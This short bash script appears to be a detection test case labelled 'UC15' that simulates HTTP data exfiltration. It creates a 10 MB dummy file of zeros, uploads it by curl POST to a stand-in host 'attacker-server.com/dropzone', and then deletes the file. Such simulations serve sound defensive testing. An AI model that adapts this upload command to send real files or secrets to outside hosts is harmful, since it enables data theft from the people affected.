#!/bin/bash
echo "[*] UC15: Simulating Data Exfiltration (HTTP)..."
# Generating a large dummy file and uploading it
dd if=/dev/zero of=large_file.dat bs=1M count=10
curl -X POST -T large_file.dat "http://attacker-server.com/dropzone"
rm large_file.dat
